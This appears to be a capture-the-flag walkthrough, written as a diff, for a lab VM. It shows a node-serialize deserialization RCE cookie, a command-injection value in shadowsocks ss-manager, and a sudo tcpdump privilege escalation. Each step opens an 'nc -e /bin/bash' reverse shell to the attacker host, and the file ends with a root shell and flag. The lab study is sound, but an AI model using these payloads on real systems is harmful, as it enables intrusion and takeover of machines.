@@ -1,0 +1,98 @@
+
+#after port scan, only 666 port is open for use, the url response is : 
+
+SyntaxError: Unexpected token F in JSON at position 79
+    at JSON.parse (<anonymous>)
+    at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)
+    at /home/nodeadmin/.web/server.js:12:29
+    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)
+    at next (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)
+    at /home/nodeadmin/.web/node_modules/express/lib/router/index.js:281:22
+    at Function.process_params (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:275:10)
+
+#it seems error of json format, cookie here is encoded by base64, try to decoded it, find errors in cookie. then modify the cookie 
+and reencoded.
+
+
+# in burp repeater, cookie starts with 'ey' base64 encoded format.
+GET / HTTP/1.1
+Host: 192.168.56.107:666
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: profile=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JldHVybiByZXF
+# the original of cookie is :
+{"username":"_$$ND_FUNC$$_function() {return require('child_process').ex
+ecSync('nc -e /bin/bash 192.168.56.105 8888'',(e,out,err)=>{console.log(out);});}()"}
+# this is a rce vuln of js, json unserialize.
+
+└─$ nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [192.168.56.105] from (UNKNOWN) [192.168.56.107] 35006
+id
+uid=1001(nodeadmin) gid=1001(nodeadmin) groups=1001(nodeadmin)
+ls /home
+fireman
+nodeadmin
+
+$ ps -aux | grep fireman
+root       815  0.0  0.0 301464  4200 ?        S    00:34   0:00 su fireman -c /usr/local/bin/ss-manager
+fireman    819  0.0  0.0  37068  4004 ?        Ss   00:34   0:00 /usr/local/bin/ss-manager
+nodeadm+  1086  0.0  0.0 213788   972 ?        S    00:54   0:00 grep fireman
+
+#after google ss-manger, which is an service for shadow-socks, and a vuln for the version 3.0.1, let's try this vuln
+
+$nc -u 127.0.0.1 8839
+$add: {"server_port":8839,"password":"ss","method":"||nc -e /bin/bash 192.168.56.105 8821 ||"}
+
+#### Listen on host 8821 port for 2nd user shell
+id
+uid=1002(fireman) gid=1002(fireman) groups=1002(fireman)
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root
+
+#### listen on host 8822 port for root shell
+$nc -nvlp 8822
+listening on [any] 8822 ...
+id
+connect to [192.168.56.105] from (UNKNOWN) [192.168.56.107] 46630
+uid=0(root) gid=0(root) groups=0(root)
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+cd root
+ls
+flag.txt
+cat flag.txt
+[+] You're a soldier. 
+[+] One of the best that the world could set against
+[+] the demonic invasion.  
+
++-----------------------------------------------------------------------------+
+| |       |\                                           -~ /     \  /          |
+|~~__     | \                                         | \/       /\          /|
+|    --   |  \                                        | / \    /    \     /   |
+|      |~_|   \                                   \___|/    \/         /      |
+|--__  |   -- |\________________________________/~~\~~|    /  \     /     \   |
+|   |~~--__  |~_|____|____|____|____|____|____|/ /  \/|\ /      \/          \/|
+|   |      |~--_|__|____|____|____|____|____|_/ /|    |/ \    /   \       /   |
+|___|______|__|_||____|____|____|____|____|__[]/_|----|    \/       \  /      |
+|  \mmmm :   | _|___|____|____|____|____|____|___|  /\|   /  \      /  \      |
+|      B :_--~~ |_|____|____|____|____|____|____|  |  |\/      \ /        \   |
+|  __--P :  |  /                                /  /  | \     /  \          /\|
+|~~  |   :  | /                                 ~~~   |  \  /      \      /   |
+|    |      |/                        .-.             |  /\          \  /     |
+|    |      /                        |   |            |/   \          /\      |
+|    |     /                        |     |            -_   \       /    \    |
++-----------------------------------------------------------------------------+
+|          |  /|  |   |  2  3  4  | /~~~~~\ |       /|    |_| ....  ......... |
+|          |  ~|~ | % |           | | ~J~ | |       ~|~ % |_| ....  ......... |
+|   AMMO   |  HEALTH  |  5  6  7  |  \===/  |    ARMOR    |#| ....  ......... |
++-----------------------------------------------------------------------------+
+
+                FLAG: kre0cu4jl4rzjicpo1i7z5l1     
